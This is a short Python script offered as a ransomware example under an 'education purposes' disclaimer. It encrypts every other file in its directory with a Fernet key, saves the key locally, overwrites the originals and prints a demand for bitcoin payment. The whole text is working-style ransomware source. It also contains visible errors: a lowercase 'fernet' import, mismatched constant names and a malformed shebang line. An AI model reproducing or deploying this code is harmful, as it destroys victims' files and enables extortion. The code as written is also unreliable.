# -- Only for Education Purposes (I am not responsible for any misuse of the programs) -- #

#!/usr/bin/env/ python3

import os
from cryptography.fernet import fernet

ENCRYPTION_PROGRAM = "kagi.py"
KEY_FILE = "thekey.key"
DECRYPTION_PROGRAM = "hiraku.py"

files = []

# Find files in the same directory as this program
for file in os.listdir():
    if file == ENCRYPTOR_PROGRAM or file == KEY_FILE or file == DECRYPTOR_PROGRAM:
        continue
    if os.path.isfile(file):
        files.append(file)

if len(files) != 0:
    print("Files: ", files)
else:
    print("No files found...")

key = Fernet.generate_key()

with open(KEY_FILE, "wb") as thekey: # <- wb = write binary
    thekey.write(key)

for file in files:
    # Step-1: get the file content
    with open(file, "rb") as thefile: # <- rb = read binary
        contents = thefile.read()
    
    # Step-2: encrypt the file content and store it in a variable named 'contents_encrypted'
    contents_encrypted = Fernet(key).encrypt(contents)
    
    # Step-3: overwrite that file's content with the previously encrypted one
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Your files have been encrypted. Pay me some bitcoins in order to get your files back!")
